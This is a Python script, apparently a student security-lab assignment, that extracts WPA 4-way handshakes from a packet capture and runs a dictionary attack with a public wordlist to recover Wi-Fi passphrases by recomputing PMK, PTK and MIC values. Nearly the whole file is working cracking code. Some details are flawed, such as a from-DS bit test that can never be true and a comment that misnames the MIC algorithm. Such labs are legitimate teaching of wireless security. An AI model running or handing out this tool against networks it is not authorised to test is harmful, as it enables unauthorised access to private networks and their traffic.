#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Auteurs : Thomann Yanick, Galley David, Gachet Jean
Date : 03/05/2023

Liste de mots utilisée trouvée ici: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
Note: ajouté "actuelle" en 1500ème position.

Derive les clés WPA depuis un mot de passe et les infos d'un 4-way handshake

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

import hashlib
import hmac
from binascii import a2b_hex, b2a_hex
from scapy.all import *
from pbkdf2 import *


# values to distinguish the messages of a 4-way handshake
key_infos = [0x008a, 0x010a, 0x13ca, 0x030a]


def is_data_from_ds(pkt):
    """
    This function returns true if the packets is a data packet going from an AP to a STA.
    """
    if pkt.haslayer(Dot11) and pkt.type == 2:  # data packets
        ds = pkt.FCfield & 0x3  # DS bits in the frame control field
        to_ds = ds & 0x1 == 1  # 1st bit is to DS
        from_ds = ds & 0x2 == 1  # 2nd bit is from DS
        return not to_ds and from_ds


def is_data_to_ds(pkt):
    """
    This function returns true if the packets is a data packet going from a STA to an AP.
    """
    if pkt.haslayer(Dot11) and pkt.type == 2:  # data packets
        ds = pkt.FCfield & 0x3  # DS bits in the frame control field
        to_ds = ds & 0x1 == 1  # 1st bit is to DS
        from_ds = ds & 0x2 == 1  # 2nd bit is from DS
        return to_ds and not from_ds


def get_key_info(pkt):
    """
    Returns the 2 bytes containing the key information.
    These values can be used to distinguish messages of a 4-way handshake.
    """
    if pkt.haslayer(EAPOL):
        payload = pkt[EAPOL].load
        return struct.unpack("!H", payload[1:3])[0]


def get_next_line_from_file(filename):
    """
    This function yields one line at a time from the given file.
    """
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


def get_ssids_and_handshakes(pcap):
    """
    This function returns 2 dictionaries:
        1) ssids: keys = SSID names, values = MAC address of AP
        2) handshakes: keys = SSID names, values = array of 4 packets constituting a 4-way handshake for the SSID
    """

    # 1. Get all SSIDs in the capture, and their associated AP MAC addresses
    # Initialize an empty dictionary
    ssids = {}
    # Iterate over all packets in capture
    for pkt in pcap:
        # If the packet is a 802.11 beacon or association request
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11AssoReq):
            # Retrieve the SSID
            ssid = pkt[Dot11Elt].info.decode()
            # Add AP to dict if not seen before
            if ssid not in ssids:
                ssids[ssid] = pkt.addr3

    # 2. Try and find a complete 4-way handshake for each SSID
    handshakes = {}
    for ssid in ssids:
        handshake = {}
        ap_mac = ssids[ssid]
        for pkt in pcap:
            # check if the packet is a WPA key packet from the AP
            if pkt.haslayer(EAPOL):
                # is it the 1st message of a 4-way handshake for the given ssid ? (from AP to client)
                if get_key_info(pkt) == key_infos[0] and pkt.addr2 == ap_mac:  # message 1 of handshake
                    # add message 1 of handshake in dictionary with key = client MAC
                    handshake[pkt.addr1] = []
                    handshake[pkt.addr1].append(pkt)
                # is it the 2nd message ? (from client to AP)
                elif get_key_info(pkt) == key_infos[1] and pkt.addr1 == ap_mac:  # message 2 of handshake
                    # if client MAC (pkt.addr2 here) already in handshake
                    if pkt.addr2 in handshake:
                        handshake[pkt.addr2].append(pkt)  # add message 2
                # is it the 3rd message ? (from AP to client)
                elif get_key_info(pkt) == key_infos[2] and pkt.addr2 == ap_mac:  # message 3 of handshake
                    # if client MAC (pkt.addr1 here) already in handshake with 2 messages
                    if pkt.addr1 in handshake and len(handshake[pkt.addr1]) == 2:
                        handshake[pkt.addr1].append(pkt)  # add message 3
                # is it the 4th message ? (from client to AP)
                elif get_key_info(pkt) == key_infos[3] and pkt.addr1 == ap_mac:  # message 4 of handshake
                    # if client MAC (pkt.addr2 here) already in handshake with 3 messages
                    if pkt.addr2 in handshake:
                        handshake[pkt.addr2].append(pkt)  # add message 4
                    handshakes[ssid] = handshake[pkt.addr2]  # add full 4-way handshake
                    break  # we found a whole 4-way handshake for this ssid
        if ssid not in handshakes:
            print("No complete 4-way handshake found for {}".format(ssid))

    return ssids, handshakes


def custom_prf512(key, a, b):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    b_len = 64
    i = 0
    r = b''
    while i <= ((b_len * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, a + str.encode(chr(0x00)) + b + str.encode(chr(i)), hashlib.sha1)
        i += 1
        r = r + hmacsha1.digest()
    return r[:b_len]


if __name__ == '__main__':

    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    # Get all 4-way handshakes in the pcap
    ssids, handshakes = get_ssids_and_handshakes(wpa)

    for ssid in ssids:
        if ssid not in handshakes.keys():
            break

        print("----- Start hacking of {} -----".format(ssid))
        handshake = handshakes[ssid]

        # getting AP and client MAC from message 1
        ap_mac = a2b_hex(handshake[0].addr2.replace(':', ''))
        client_mac = a2b_hex(handshake[0].addr1.replace(':', ''))

        # Authenticator and Supplicant Nonces
        key_data = handshake[0][EAPOL].load  # AP nonce is in the 1st message
        ap_nonce = a2b_hex(key_data[13:45].hex())
        key_data = handshake[1][EAPOL].load  # client nonce is in the 2nd message
        client_nonce = a2b_hex(key_data[13:45].hex())

        # This is the MIC contained in the 4th frame of the 4-way handshake
        key_data = handshake[3][EAPOL].load
        mic_to_test = key_data[-18:-2].hex()

        # Computing necessary values
        a = b"Pairwise key expansion"  # this string is used in the pseudo-random function
        b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)

        # Data on which to compute the MIC
        dot11_version = b"\x01"  # 802.1X-2001
        dott11_type = b"\x03"  # key
        message4_len = b"\x00\x5f"  # 95 bytes
        payload = handshake[3][EAPOL].load
        payload = payload[0:-18] + b"\x00" * 16 + payload[-2:]  # putting MIC to 0
        data = a2b_hex(dot11_version.hex() + dott11_type.hex() + message4_len.hex() + payload.hex())

        passphrases_filename = "probable-v2-wpa-top4800.txt"
        for passphrase in get_next_line_from_file(passphrases_filename):
            # derives the PMK and then the PTK
            pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), str.encode(ssid), 4096, 32)
            ptk = custom_prf512(pmk, a, b)

            # PTK = KCK|KEK|TK|MICK
            kck = ptk[0:16]

            # calculate MIC over EAPOL payload (Michael)
            # as seen with the assistant, the output of hmac here is too large, taking only the first 32 bytes
            mic = hmac.new(kck, data, hashlib.sha1).hexdigest()[0:32]
            if mic == mic_to_test:
                print("The passphrase for \"{}\" is: {}".format(ssid, passphrase))
                exit()

        print("The passphrase for \"{}\" was not found in the file.".format(ssid))
